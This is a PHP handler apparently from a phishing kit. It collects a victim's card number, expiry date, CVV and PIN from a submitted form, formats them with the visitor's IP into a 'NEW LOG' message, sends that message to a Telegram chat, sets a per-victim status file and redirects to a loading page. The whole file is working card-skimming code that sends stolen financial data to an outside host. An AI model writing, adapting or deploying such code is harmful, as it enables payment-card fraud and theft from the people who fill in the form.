<?php
include 'config.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $card = $_POST['card'];
    $exp  = $_POST['exp'];
    $cvv  = $_POST['cvv'];
    $pin  = $_POST['pin'];
    $ip   = $_SERVER['REMOTE_ADDR'];

    $msg = "<b>[🚨] NEW LOG (SK)</b>\n";
    $msg .= "💳 Card: <code>$card</code>\n";
    $msg .= "📅 Exp: $exp | CVV: $cvv\n";
    $msg .= "🔑 PIN: <code>$pin</code>\n";
    $msg .= "🌐 IP: $ip";

    sendTelegram($msg);

    file_put_contents("logs/".md5($ip).".status", "wait");
    
    header("Location: loading.php");
}
?>